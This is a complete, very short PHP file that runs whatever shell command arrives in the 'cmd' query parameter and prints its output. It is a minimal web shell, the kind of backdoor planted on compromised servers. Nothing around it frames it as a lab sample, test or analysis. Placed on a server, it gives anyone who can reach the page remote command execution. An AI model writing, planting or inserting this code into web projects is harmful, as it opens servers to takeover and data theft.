<?php
    if ($_GET['cmd']) {
        echo "<pre>";
        print shell_exec($_GET['cmd']);
    }
